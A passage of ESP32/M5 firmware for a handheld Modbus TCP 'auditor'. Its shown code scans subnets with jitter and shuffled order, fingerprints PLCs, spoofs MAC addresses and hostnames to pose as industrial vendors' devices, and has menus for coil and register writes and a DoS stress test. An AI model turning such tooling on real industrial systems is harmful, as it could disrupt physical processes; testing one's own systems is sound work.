              canvas.fillRect(0, 20, 240, 95, BLACK);
              canvas.setTextDatum(TC_DATUM);
              canvas.setTextColor(TERM_ORANGE);
              canvas.drawString(step != 1 ? "NON-SEQUENTIAL" : "LINEAR SWEEP", 120, 30, 1);
              canvas.setTextDatum(MC_DATUM); canvas.setTextColor(WHITE);
              
              // Memory safe string formatting
              char checkStr[32];
              if (cidr < 24) snprintf(checkStr, sizeof(checkStr), "Checking: .%d.%d", tIP[2], tIP[3]);
              else snprintf(checkStr, sizeof(checkStr), "Checking: .%d", tIP[3]);
              canvas.drawString(checkStr, 120, 60, 4);
              
              canvas.setTextColor(TERM_PURPLE);
              char jitterStr[32];
              snprintf(jitterStr, sizeof(jitterStr), "Jitter: %d ms", jitter);
              canvas.drawString(jitterStr, 120, 85, 2);
              
              int barW = map(scannedCount, 0, maxHosts, 0, 240);
              canvas.fillRect(0, 105, barW, 5, TERM_BLUE);
              canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
              canvas.drawString("B(L): Stop Scan", 120, 135, 2);
              canvas.pushSprite(0,0);
              last_ui_update = millis();
            }

            uint8_t rawIP[4] = {tIP[0], tIP[1], tIP[2], tIP[3]};
            W5100.writeSnMR(s, 0x01); W5100.writeSnPORT(s, random(10000, 60000)); W5100.execCmdSn(s, (SockCMD)0x01);
            W5100.writeSnIR(s, 0xFF); W5100.writeSnDIPR(s, rawIP); W5100.writeSnDPORT(s, targetPort);
            W5100.execCmdSn(s, (SockCMD)0x04);
            socketStartTime[s] = millis();
            socketTargetIP[s] = targetInt;
          }
        }
        else if (stat == 0x17) {
          uint32_t foundInt = socketTargetIP[s];
          IPAddress foundIP(foundInt>>24, (foundInt>>16)&0xFF, (foundInt>>8)&0xFF, foundInt&0xFF);

          W5100.execCmdSn(s, (SockCMD)0x08); unsigned long waitFin = millis();
          while(W5100.readSnSR(s) != 0x00 && millis() - waitFin < 100) { delay(1); }
          W5100.execCmdSn(s, (SockCMD)0x10); delay(50);

          Ethernet.setRetransmissionTimeout(200);
          bool isRealPLC = verifyModbusService(foundIP, targetPort);
          Ethernet.setRetransmissionTimeout(25);
          
          TargetHost t; t.ip = foundIP; t.status = isRealPLC ? "MODBUS OK" : "PORT OPEN";
          foundTargets.push_back(t);
          hostsCount++;
          
          canvas.fillRect(0, 20, 240, 95, BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(GREEN);
          
          // Memory safe string formatting
          char ip_str[32];
          if (cidr < 24) snprintf(ip_str, sizeof(ip_str), ".%d.%d OPEN", foundIP[2], foundIP[3]);
          else snprintf(ip_str, sizeof(ip_str), ".%d OPEN", foundIP[3]);
          canvas.drawString(ip_str, 120, 53, 4);
          
          if (isRealPLC) {
              canvas.setTextColor(TERM_GREEN);
              canvas.drawString("MODBUS OK!", 120, 93, 4);
              M5.Speaker.tone(5000, 50); delay(80); M5.Speaker.tone(5000, 50);
          } else {
              canvas.setTextColor(TERM_PURPLE);
              canvas.drawString("RAW PORT", 120, 93, 4);
              M5.Speaker.tone(4000, 50);
          }
          canvas.pushSprite(0,0); delay(2500);
        }
        else if (stat == 0x15) { if (millis() - socketStartTime[s] > 300) W5100.execCmdSn(s, (SockCMD)0x10); }
        else { if (millis() - socketStartTime[s] > 400) W5100.execCmdSn(s, (SockCMD)0x10); }
      }
    }
  } else {
    wClient.setTimeout(15);
    uint32_t last_ui_update = 0;
    
    while (scannedCount < maxHosts && hostsCount < 10) {
      M5.update();
      if (M5.BtnB.pressedFor(800)) {
          canvas.fillScreen(BLACK);
          drawBattery(&canvas, true); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_RED);
          canvas.drawString("STOPPING IPs SCANNING...", 120, 67, 2); canvas.pushSprite(0,0);
          while(M5.BtnB.isPressed()) { M5.update(); yield(); }
          abortScan = true; break;
      }

      uint32_t currentOffset = offsetVal;
      offsetVal = (offsetVal + step) % maxHosts;
      if (offsetVal == 0) offsetVal = maxHosts;
      scannedCount++;

      uint32_t targetInt = netInt + currentOffset;
      IPAddress targetIP(targetInt>>24, (targetInt>>16)&0xFF, (targetInt>>8)&0xFF, targetInt&0xFF);
      int jitter = 10 + (esp_random() % 30); delay(jitter);

      if (millis() - last_ui_update > 200) {
          canvas.fillRect(0, 20, 240, 95, BLACK);
          canvas.setTextDatum(TC_DATUM); canvas.setTextColor(TERM_ORANGE);
          canvas.drawString(step != 1 ? "NON-SEQUENTIAL" : "LINEAR SWEEP", 120, 30, 1);
          canvas.setTextDatum(MC_DATUM); canvas.setTextColor(WHITE);
          
          // Memory safe string formatting
          char checkStr[32];
          if (cidr < 24) snprintf(checkStr, sizeof(checkStr), "Checking: .%d.%d", targetIP[2], targetIP[3]);
          else snprintf(checkStr, sizeof(checkStr), "Checking: .%d", targetIP[3]);
          canvas.drawString(checkStr, 120, 60, 4);
          
          canvas.setTextColor(TERM_PURPLE);
          char jitterStr[32];
          snprintf(jitterStr, sizeof(jitterStr), "Jitter: %d ms", jitter);
          canvas.drawString(jitterStr, 120, 85, 2);
          
          int barW = map(scannedCount, 0, maxHosts, 0, 240);
          canvas.fillRect(0, 105, barW, 5, TERM_BLUE);
          canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
          canvas.drawString("B(L): Stop Scan", 120, 135, 2);
          canvas.pushSprite(0,0); last_ui_update = millis();
      }

      if (wClient.connect(targetIP, targetPort, 250)) {
         wClient.stop();
         delay(50);
         bool isRealPLC = verifyModbusService(targetIP, targetPort);
         TargetHost t; t.ip = targetIP; t.status = isRealPLC ? "MODBUS OK" : "PORT OPEN";
         foundTargets.push_back(t);
         hostsCount++;

         canvas.fillRect(0, 20, 240, 95, BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(GREEN);
         
         // Memory safe string formatting
         char ip_str[32];
         if (cidr < 24) snprintf(ip_str, sizeof(ip_str), ".%d.%d OPEN", targetIP[2], targetIP[3]);
         else snprintf(ip_str, sizeof(ip_str), ".%d OPEN", targetIP[3]);
         canvas.drawString(ip_str, 120, 53, 4);
         
         if (isRealPLC) {
              canvas.setTextColor(TERM_GREEN);
              canvas.drawString("MODBUS OK!", 120, 93, 4);
              M5.Speaker.tone(5000, 50); delay(80); M5.Speaker.tone(5000, 50);
         } else {
              canvas.setTextColor(TERM_PURPLE);
              canvas.drawString("RAW PORT", 120, 93, 4); 
              M5.Speaker.tone(4000, 50);
         }
         canvas.pushSprite(0,0); delay(2500);
      }
    }
  }

  canvas.fillScreen(BLACK);
  drawBattery(&canvas, true); canvas.setTextDatum(MC_DATUM);
  canvas.setTextColor(abortScan ? TERM_ORANGE : TERM_GREEN);
  canvas.drawString(abortScan ? "SCAN STOPPED" : "SCAN COMPLETE!", 120, 67, 2);
  canvas.pushSprite(0,0); delay(1000);
  currentState = STATE_SCAN_RESULT;
}

// ==========================================
// 9. PRE-ATTACK MENUS (NETWORK AND SPOOFING)
// ==========================================
void drawSpoofLoadMenu() {
    canvas.fillScreen(BLACK); drawBattery(&canvas, true);
    canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_GREEN);
    canvas.drawString("LAST PROFILE", 120, 30, 2);
    canvas.setTextColor(WHITE); canvas.drawString(profiles[savedProfileIdx].model, 120, 68, 4);
    canvas.setTextColor(TERM_ORANGE); canvas.drawString(currentHost, 120, 96, 2);
    canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
    canvas.drawString("A: Change | B: Use", 120, 135, 2); canvas.pushSprite(0,0);
  
    while (true) { 
        M5.update();
        if (M5.BtnA.wasClicked()) { currentState = STATE_SPOOF_VENDOR; return; }
        if (M5.BtnB.wasReleased()) { currentState = STATE_NET_SELECT; return; } delay(20);
    }
}

void drawSpoofVendorMenu() {
  canvas.fillScreen(BLACK); drawBattery(&canvas, true);
  canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_GREEN); 
  canvas.drawString("1. SELECT VENDOR", 120, 30, 2);
  canvas.setTextColor(WHITE);
  canvas.drawString(vendors[selectedVendorIndex], 120, 79, 4);
  canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
  canvas.drawString("A: Change | B: Next", 120, 135, 2); canvas.pushSprite(0,0);
  
  while (true) { 
    M5.update();
    if (M5.BtnA.wasClicked()) { selectedVendorIndex = (selectedVendorIndex + 1) % numVendors; return; }
    if (M5.BtnB.wasReleased()) { currentState = STATE_SPOOF_MODEL; return; } delay(20);
  }
}

void drawSpoofModelMenu() {
  std::vector<int> vendorModels;
  for (int i = 0; i < totalProfiles; i++) {
    if (strcmp(profiles[i].vendor, vendors[selectedVendorIndex]) == 0) vendorModels.push_back(i);
  }
  static int localModelIndex = 0; if (localModelIndex >= vendorModels.size()) localModelIndex = 0;
  
  canvas.fillScreen(BLACK); drawBattery(&canvas, true);
  canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_GREEN);
  canvas.drawString("2. SELECT MODEL", 120, 30, 2);
  
  int profileIdx = vendorModels[localModelIndex];
  canvas.setTextColor(WHITE); canvas.drawString(profiles[profileIdx].model, 120, 68, 4);
  canvas.setTextColor(TERM_ORANGE); canvas.drawString(profiles[profileIdx].host, 120, 96, 2);
  canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN); 
  canvas.drawString("A: Change | B: Set | B(L): Back", 120, 135, 2); canvas.pushSprite(0,0);
  
  while (true) { 
    M5.update();
    if (M5.BtnA.wasClicked()) { localModelIndex = (localModelIndex + 1) % vendorModels.size(); return; }
    if (M5.BtnB.pressedFor(800)) {
        canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE);
        canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0);
        currentState = STATE_SPOOF_VENDOR; while(M5.BtnB.isPressed()) { M5.update(); yield(); } return;
    }
    else if (M5.BtnB.wasReleased()) {
      int finalIdx = vendorModels[localModelIndex];
      currentMac[0] = profiles[finalIdx].oui[0];
      currentMac[1] = profiles[finalIdx].oui[1]; currentMac[2] = profiles[finalIdx].oui[2];
      if (strcmp(vendors[selectedVendorIndex], "Default") == 0) { 
        currentMac[3] = 0xEF;
        currentMac[4] = 0xFE; currentMac[5] = 0xED; 
      } else { 
        currentMac[3] = esp_random() % 256;
        currentMac[4] = esp_random() % 256; currentMac[5] = esp_random() % 256;
      }
      currentHost = profiles[finalIdx].host;
      preferences.begin("spoof_cfg", false);
      preferences.putInt("profile_idx", finalIdx); preferences.putBytes("mac", currentMac, 6);
      preferences.putString("host", currentHost); preferences.end();
      savedProfileIdx = finalIdx;
      currentState = STATE_NET_SELECT; localModelIndex = 0; return;
    } delay(20);
  }
}

void drawNetMenu() {
  canvas.fillScreen(BLACK); drawBattery(&canvas, true); canvas.setTextDatum(MC_DATUM); 
  canvas.setTextColor(TERM_GREEN); canvas.drawString("NETWORK INTERFACE", 120, 30, 2);
  canvas.setTextColor(!useEthernet ? TERM_ORANGE : WHITE); canvas.drawString("WIFI", 120, 60, 4);
  canvas.setTextColor(useEthernet ? TERM_ORANGE : WHITE); canvas.drawString("ETHERNET (W5500)", 120, 95, 4);
  canvas.setTextDatum(BC_DATUM);
  canvas.setTextColor(CYAN);
  canvas.drawString("A: Change | B: Sel | B(L): Back", 120, 135, 2); canvas.pushSprite(0,0);
  
  while (true) { 
    M5.update();
    if (M5.BtnA.wasClicked()) { useEthernet = !useEthernet; return; }
    if (M5.BtnB.pressedFor(800)) {
        canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE);
        canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0); 
        currentState = (savedProfileIdx != -1) ? STATE_SPOOF_LOAD : STATE_SPOOF_VENDOR; 
        while(M5.BtnB.isPressed()) { M5.update(); yield(); } return;
    } 
    else if (M5.BtnB.wasReleased()) {
      netClient = useEthernet ? (Client*)&eClient : (Client*)&wClient;
      currentState = useEthernet ? STATE_ETH_INIT : STATE_WIFI; return;
    } delay(20);
  }
}

void initEthernet() {
  canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_GREEN);
  canvas.drawString("INIT ETHERNET...", 120, 40, 2); canvas.pushSprite(0,0);
  
  SPI.begin(W5500_SCLK, W5500_MISO, W5500_MOSI, W5500_CS); 
  Ethernet.init(W5500_CS);
  
  if (Ethernet.begin(currentMac, 4000, 4000) == 0) {
    canvas.setTextColor(TERM_RED); canvas.drawString("DHCP FAILED", 120, 70, 2); 
    canvas.setTextColor(TERM_ORANGE);
    canvas.drawString("BLACK BOX MODE", 120, 100, 2); 
    canvas.pushSprite(0,0); delay(1500); 
    currentState = STATE_INFER_SUBNET;
  } else {
    canvas.setTextColor(WHITE);
    canvas.drawString("DHCP ASSIGNED", 120, 70, 2); 
    canvas.pushSprite(0,0); delay(1000);
    
    Ethernet.setRetransmissionTimeout(200); Ethernet.setRetransmissionCount(2); 
    myIP = Ethernet.localIP(); subnetMask = Ethernet.subnetMask(); gateway = Ethernet.gatewayIP();
    
    uint32_t sm = (subnetMask[0]<<24) | (subnetMask[1]<<16) | (subnetMask[2]<<8) | subnetMask[3];
    cidr = __builtin_popcount(sm);
    uint32_t ipInt = (myIP[0]<<24) | (myIP[1]<<16) | (myIP[2]<<8) | myIP[3];
    uint32_t netInt = ipInt & sm;
    networkBase = IPAddress(netInt >> 24, (netInt >> 16) & 0xFF, (netInt >> 8) & 0xFF, netInt & 0xFF);
    
    canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_GREEN);
    canvas.drawString("IP ASSIGNED", 120, 50, 2); canvas.setTextColor(TERM_ORANGE); 
    
    char finalIpBuf[32];
    snprintf(finalIpBuf, sizeof(finalIpBuf), "%d.%d.%d.%d /%d", myIP[0], myIP[1], myIP[2], myIP[3], cidr);
    canvas.drawString(finalIpBuf, 120, 80, 2); canvas.pushSprite(0,0);
    delay(2000);
    currentState = STATE_MAIN_MENU;
  }
}

void connectWiFi() {
  if (storedSSID == "") { setupAPAndServer(); return; }
  
  M5.Lcd.fillScreen(BLACK); M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextFont(2); M5.Lcd.setTextColor(TERM_GREEN); 
  M5.Lcd.drawString("CONNECTING WIFI...", 120, 50, 2);
  
  WiFi.disconnect(true, true); delay(100); WiFi.mode(WIFI_STA); 
  
  esp_wifi_set_mac(WIFI_IF_STA, currentMac);
  esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
  if (netif) { esp_netif_set_hostname(netif, currentHost.c_str()); }
  WiFi.setHostname(currentHost.c_str());
  
  WiFi.begin(storedSSID.c_str(), storedPASS.c_str());
  M5.Lcd.setTextColor(WHITE); M5.Lcd.drawString(storedSSID, 120, 80, 2);
  
  int timeout = 0;
  while (WiFi.status() != WL_CONNECTED) {
    M5.update(); yield(); delay(250); M5.Lcd.fillRect(100, 100, 40, 20, BLACK);
    static int f = 0; f = !f; if (f) M5.Lcd.drawString(">>>", 120, 110, 2); timeout++;
    if (timeout > 40) { setupAPAndServer(); return; }
  }
  
  myIP = WiFi.localIP(); subnetMask = WiFi.subnetMask();
  gateway = WiFi.gatewayIP();
  uint32_t sm = (subnetMask[0]<<24) | (subnetMask[1]<<16) | (subnetMask[2]<<8) | subnetMask[3];
  cidr = __builtin_popcount(sm);
  
  uint32_t ipInt = (myIP[0]<<24) | (myIP[1]<<16) | (myIP[2]<<8) | myIP[3];
  uint32_t netInt = ipInt & sm;
  networkBase = IPAddress(netInt >> 24, (netInt >> 16) & 0xFF, (netInt >> 8) & 0xFF, netInt & 0xFF);

  M5.Lcd.fillScreen(BLACK); M5.Lcd.setTextColor(TERM_GREEN);
  M5.Lcd.drawString("LINK ESTABLISHED", 120, 50, 4); 
  M5.Lcd.setTextColor(TERM_ORANGE); M5.Lcd.drawString("LOCAL IP ASSIGNED", 120, 80, 2); 
  M5.Lcd.setTextColor(WHITE);
  
  char finalIpBuf[32];
  snprintf(finalIpBuf, sizeof(finalIpBuf), "%d.%d.%d.%d /%d", myIP[0], myIP[1], myIP[2], myIP[3], cidr);
  M5.Lcd.drawString(finalIpBuf, 120, 100, 2);
  
  currentState = STATE_MAIN_MENU; delay(2000);
}

void drawWifiLostMenu() {
    canvas.fillScreen(BLACK);
    drawBattery(&canvas, true);
    canvas.setTextDatum(TC_DATUM); canvas.setTextColor(TERM_RED); canvas.drawString("CONNECTION LOST!", 120, 10, 2);
    canvas.setTextDatum(MC_DATUM); canvas.setTextColor(WHITE);
    canvas.drawString("Network link is down.", 120, 50, 2);
    canvas.setTextDatum(BC_DATUM); canvas.setTextColor(TERM_GREEN);
    canvas.drawString("A: Retry | B: Net Select", 120, 115, 2);
    canvas.setTextColor(CYAN);
    canvas.drawString("B(L): Vendor Menu", 120, 135, 2); canvas.pushSprite(0,0);
    while (true) {
        M5.update();
        if (M5.BtnA.wasReleased()) { currentState = useEthernet ? STATE_ETH_INIT : STATE_WIFI; return; }
        if (M5.BtnB.pressedFor(800)) { 
            canvas.fillScreen(BLACK);
            canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE);
            canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0); currentState = STATE_SPOOF_VENDOR;
            while(M5.BtnB.isPressed()) { M5.update(); yield(); } return;
        } else if (M5.BtnB.wasReleased()) { currentState = STATE_NET_SELECT; return; } delay(20);
    }
}

void drawBattery(M5Canvas *c, bool readHardware) {
  static int batLevel = 0;
  if (readHardware) { 
    int vol = M5.Power.getBatteryVoltage(); batLevel = map(vol, 3300, 4200, 0, 100);
    if (batLevel < 0) batLevel = 0; if (batLevel > 100) batLevel = 100;
  }
  int x = 205, y = 4, w = 30, h = 10;
  uint16_t color = (batLevel < 20) ? TERM_RED : (batLevel < 40) ? TERM_ORANGE : TERM_GREEN;
  c->drawRect(x, y, w, h, WHITE); c->fillRect(x + w, y + 2, 2, h - 4, WHITE);
  c->fillRect(x + 1, y + 1, w - 2, h - 2, BLACK);
  int fillW = map(batLevel, 0, 100, 0, w - 2);
  if (fillW > 0) c->fillRect(x + 1, y + 1, fillW, h - 2, color);
}

// ==========================================
// 10. TOOLS AND AUDITOR MODES MENUS
// ==========================================
void drawMainMenu() {
  canvas.fillScreen(BLACK); drawBattery(&canvas, true); 
  canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_GREEN);
  canvas.drawString("MODBUS TCP AUDITOR", 120, 30, 2);
  
  canvas.setTextColor(TERM_ORANGE);
  canvas.drawString("START SCANNER", 120, 75, 4);
  
  canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
  canvas.drawString("B: Select | B(L): Disconn", 120, 135, 2); canvas.pushSprite(0,0);
  if (M5.BtnB.pressedFor(800)) {
      canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE);
      canvas.drawString("DISCONNECTING...", 120, 67, 2); canvas.pushSprite(0,0);
      if (!useEthernet) { WiFi.disconnect(true, true); WiFi.mode(WIFI_OFF); }
      currentState = STATE_NET_SELECT;
      while(M5.BtnB.isPressed()) { M5.update(); yield(); } return;
  }
  else if (M5.BtnB.wasReleased()) { 
    currentState = STATE_PORT_SELECT;
  }
}

void selectPortScreen() {
 canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM);
 canvas.setTextColor(TERM_GREEN); 
 canvas.drawString("TARGET PORT", 120, 30, 2); canvas.setTextColor(WHITE);
 
 char portBuf[32];
 snprintf(portBuf, sizeof(portBuf), "< %d >", COMMON_PORTS[selectedPortIndex]);
 canvas.drawString(portBuf, 120, 67, 4); 
 
 canvas.setTextColor(TERM_ORANGE);
 canvas.drawString((COMMON_PORTS[selectedPortIndex] == 502) ? "Standard Modbus" : "Alternative Port", 120, 95, 2); 
 canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
 canvas.drawString("A: Change | B: Scan | B(L): Back", 120, 135, 2); 
 drawBattery(&canvas, true); canvas.pushSprite(0,0);
 
 while (true) { 
   M5.update(); 
   if (M5.BtnA.wasClicked()) { 
     selectedPortIndex++;
     if (selectedPortIndex >= 10) selectedPortIndex = 0; 
     return;
   } 
   if (M5.BtnB.pressedFor(800)) { 
       canvas.fillScreen(BLACK);
       canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE);
       canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0);
       currentState = STATE_MAIN_MENU; while(M5.BtnB.isPressed()) { M5.update(); yield(); } return;
   }
   else if (M5.BtnB.wasReleased()) { currentState = STATE_SCANNING; return; } delay(20); 
 }
}

void drawScanResults() {
  canvas.fillScreen(BLACK); drawBattery(&canvas, true);
  canvas.setTextDatum(MC_DATUM);
  if (foundTargets.empty()) { 
    canvas.setTextColor(TERM_RED); canvas.drawString("NO TARGETS", 120, 58, 4); 
    canvas.setTextColor(WHITE);
    canvas.drawString("0 Hosts Found", 120, 88, 2);
    canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN); canvas.drawString("B: Retry | B(L): Select Port", 120, 135, 2);
  } else { 
    canvas.setTextColor(TERM_GREEN); canvas.drawString("SCAN COMPLETE", 120, 50, 2); 
    canvas.setTextColor(WHITE);
    
    char countBuf[32];
    snprintf(countBuf, sizeof(countBuf), "%d Hosts Found", foundTargets.size());
    canvas.drawString(countBuf, 120, 80, 4); 
    
    canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN); canvas.drawString("B: Select | B(L): Re-Scan", 120, 135, 2);
  } 
  canvas.pushSprite(0,0);
}

void drawTargetSelection() {
  canvas.fillScreen(BLACK); drawBattery(&canvas, true); canvas.setTextDatum(MC_DATUM);
  canvas.setTextColor(TERM_GREEN); canvas.drawString("TARGET LIST", 120, 20, 2);
  
  TargetHost t = foundTargets[selectedTargetIndex];
  if (t.status == "MODBUS OK") { canvas.setTextColor(WHITE); } else { canvas.setTextColor(0x780F); } 
  canvas.drawString(t.ip.toString(), 120, 67, 4); 
  canvas.setTextColor(TERM_BLUE); canvas.drawString(t.status, 120, 98, 2); 
  canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
  canvas.drawString("A: Next | B: Select | B(L): Back", 120, 135, 2); canvas.pushSprite(0,0);
}

bool verifyModbusService(IPAddress ip, uint16_t port) {
  if (!netClient->connected()) { 
    // Increased timeout to accommodate simulated environments
    bool c = useEthernet ? eClient.connect(ip, port) : wClient.connect(ip, port, 400); 
    if (!c) return false;
  }
  
  uint8_t probe[] = { 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x01 };
  netClient->write(probe, 12);
  
  unsigned long start = millis();
  int bytesRead = 0; 
  uint8_t response[12];
  bool isValidModbus = false;
  
  // Relaxed timeout to 1000ms to absorb Windows/Python software stack latencies
  while (millis() - start < 1000 && bytesRead < 8) {
     if (netClient->available() > 0) { 
         response[bytesRead++] = netClient->read();
     } 
     delay(1);
  }

  if (bytesRead >= 8) {
      if (response[0] == 0x00 && response[1] == 0x01 && 
          response[2] == 0x00 && response[3] == 0x00) {
          isValidModbus = true;
      }
  }

  // Safe buffer flushing without blocking the ESP32 CPU loop
  int flushLimit = 256;
  while (netClient->available() > 0 && flushLimit-- > 0) {
      netClient->read();
  }

  netClient->stop();
  delay(50);
  return isValidModbus;
}

void drawTargetMenu() {
  canvas.fillScreen(BLACK); drawBattery(&canvas, true); canvas.setTextDatum(TC_DATUM);
  canvas.setTextColor(TERM_GREEN);
  canvas.drawString("TARGET TOOLS", 120, 5, 2); 
  canvas.setTextColor(WHITE);
  char targetStr[64];
  snprintf(targetStr, sizeof(targetStr), "%s | ID: %d", foundTargets[selectedTargetIndex].ip.toString().c_str(), targetUnitID);
  canvas.drawString(targetStr, 120, 25, 2);
  
  const char* optionsP0[] = { "AUDITOR (Control)", "FINGERPRINT ID", "SCAN UNIT IDs" };
  const char* optionsP1[] = { "CONFIG WRITE VAL", "STRESS TEST (DoS)" };
  int totalItems = (targetMenuPage == 0) ? 3 : 2;
  
  for (int i = 0; i < totalItems; i++) { 
    int yPos = 50 + (i * 25);
    if (i == menuIndex) canvas.setTextColor(TERM_ORANGE); else canvas.setTextColor(TERM_GRAY); 
    if (targetMenuPage == 0) canvas.drawString(optionsP0[i], 120, yPos, 2); else canvas.drawString(optionsP1[i], 120, yPos, 2);
  }
  
  canvas.setTextDatum(MC_DATUM); 
  for (int i = 0; i < 2; i++) { 
    canvas.drawCircle(220, 60 + (i * 10), 3, (i == targetMenuPage) ? TERM_GREEN : TERM_GRAY);
    if (i == targetMenuPage) canvas.fillCircle(220, 60 + (i * 10), 2, TERM_GREEN); 
  }
  canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
  canvas.drawString("A: Nav | A(L): Next Page | B: Go", 120, 135, 2); canvas.pushSprite(0,0);
  
  if (M5.BtnA.pressedFor(800)) { 
    targetMenuPage = !targetMenuPage; menuIndex = 0; canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); 
    canvas.setTextColor(TERM_ORANGE);
    canvas.drawString("NEXT PAGE...", 120, 67, 2); canvas.pushSprite(0,0); 
    while (M5.BtnA.isPressed()) { M5.update(); yield(); }
  } else if (M5.BtnA.wasReleased()) { 
    menuIndex++; if (menuIndex >= totalItems) menuIndex = 0;
  }
  if (M5.BtnB.pressedFor(800)) { 
    canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE); 
    canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0);
    currentState = STATE_TARGET_SELECT;
    while (M5.BtnB.isPressed()) { M5.update(); yield(); }
    drawTargetSelection(); return;
  } else if (M5.BtnB.wasReleased()) {
    if (targetMenuPage == 0) { 
      if (menuIndex == 0) { currentState = STATE_AUDITOR_MENU; auditorMenuPage = 0; auditorMenuIndex = 0; } 
      if (menuIndex == 1) currentState = STATE_FINGERPRINT;
      if (menuIndex == 2) currentState = STATE_UNIT_ID_SCAN; 
    } else { 
      if (menuIndex == 0) currentState = STATE_EDIT_VALUE;
      if (menuIndex == 1) currentState = STATE_FUZZER; 
    }
  }
}

void drawAuditorMenu() {
  canvas.fillScreen(BLACK); drawBattery(&canvas, true); canvas.setTextDatum(TC_DATUM); canvas.setTextColor(TERM_GREEN);
  canvas.drawString("SELECT OPERATION", 120, 5, 2); canvas.setTextColor(WHITE); 
  char tgtStr[64];
  snprintf(tgtStr, sizeof(tgtStr), "TGT: %s | ID: %d", foundTargets[selectedTargetIndex].ip.toString().c_str(), targetUnitID);
  canvas.drawString(tgtStr, 120, 25, 2);
  
  const char* opsP0[] = { "READ COILS (01)", "WRITE COIL ON (05)", "WRITE COIL OFF (05)" };
  const char* opsP1[] = { "READ DISC IN (02)", "READ HOLD. REG (03)", "WRITE HOLD. REG (06)" };
  const char* opsP2[] = { "READ INPUT REG (04)" };
  
  int totalItems = 3;
  if (auditorMenuPage == 2) totalItems = 1;
  
  for (int i = 0; i < totalItems; i++) { 
    int yPos = 50 + (i * 25);
    if (i == auditorMenuIndex) canvas.setTextColor(TERM_ORANGE); else canvas.setTextColor(TERM_GRAY); 
    if (auditorMenuPage == 0) canvas.drawString(opsP0[i], 120, yPos, 2);
    else if (auditorMenuPage == 1) canvas.drawString(opsP1[i], 120, yPos, 2); 
    else canvas.drawString(opsP2[i], 120, yPos, 2); 
  }
  canvas.setTextDatum(MC_DATUM);
  
  for (int i = 0; i < 3; i++) { 
    canvas.drawCircle(230, 60 + (i * 10), 3, (i == auditorMenuPage) ? TERM_GREEN : TERM_GRAY);
    if (i == auditorMenuPage) canvas.fillCircle(230, 60 + (i * 10), 2, TERM_GREEN); 
  }
  
  canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
  canvas.drawString("A: Nav | A(L): Pg | B: Sel | B(L): Back", 120, 135, 2); canvas.pushSprite(0,0);
  
  if (M5.BtnA.pressedFor(800)) { 
    auditorMenuPage++; if (auditorMenuPage > 2) auditorMenuPage = 0; auditorMenuIndex = 0; canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM);
    canvas.setTextColor(TERM_ORANGE); canvas.drawString("NEXT PAGE...", 120, 67, 2); canvas.pushSprite(0,0); 
    while(M5.BtnA.isPressed()) { M5.update(); yield(); }
  } else if (M5.BtnA.wasReleased()) { 
    auditorMenuIndex++; if (auditorMenuIndex >= totalItems) auditorMenuIndex = 0;
  }
  
  if (M5.BtnB.pressedFor(800)) { 
    canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE); canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0);
    currentState = STATE_TARGET_MENU;
    while (M5.BtnB.isPressed()) { M5.update(); yield(); } return;
  } else if (M5.BtnB.wasReleased()) {
    if (auditorMenuPage == 0) { 
      if (auditorMenuIndex == 0) currentMode = MODE_READ_COIL;
      if (auditorMenuIndex == 1) currentMode = MODE_WRITE_COIL_ON; 
      if (auditorMenuIndex == 2) currentMode = MODE_WRITE_COIL_OFF;
    }
    else if (auditorMenuPage == 1) { 
      if (auditorMenuIndex == 0) currentMode = MODE_READ_DISC_IN;
      if (auditorMenuIndex == 1) currentMode = MODE_READ_H_REG; 
      if (auditorMenuIndex == 2) currentMode = MODE_WRITE_H_REG;
    } else { if (auditorMenuIndex == 0) currentMode = MODE_READ_I_REG; }
    
    pageBase = 0; addrOffset = 0;
    statusMsg = "READY"; lastReadValue = -1; lastActionSuccess = false;
    isAttacking = false; currentState = STATE_CONTROLLER; auditorMenuIndex = 0;
    auditorMenuPage = 0;
    drawControllerUI(true);
  }
}

